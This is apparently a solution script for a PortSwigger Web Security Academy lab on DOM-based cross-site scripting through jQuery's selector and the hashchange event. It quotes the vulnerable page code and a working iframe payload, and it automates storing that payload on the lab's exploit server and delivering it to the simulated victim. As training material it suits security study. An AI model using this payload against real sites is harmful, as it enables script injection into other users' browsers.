'''
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

Lab link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
'''

'''Vulnurable code
                    <script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
'''

import requests


lab_id = '0a4c0017034d4329918903d3002e0076' # change based on generated lab
exploit_serv_id = 'exploit-0ab40077035d43c791b0024301fa00a0' # change based on generated exploit server

payload = f'''<iframe src="https://{lab_id}.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>''' # hash portion contains the payload

def main():
    # upload payload to the exploit server
    uri = f"https://{exploit_serv_id}.exploit-server.net"
    data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": payload, "formAction": "STORE"}
    r1 = requests.post(uri, data=data)
    

    # Trigger the victim to access the exploit server and activate the clickjack payload
    uri = f"https://{exploit_serv_id}.exploit-server.net/deliver-to-victim"
    r2 = requests.get(uri)
    print('done')


if __name__ == '__main__':
    main()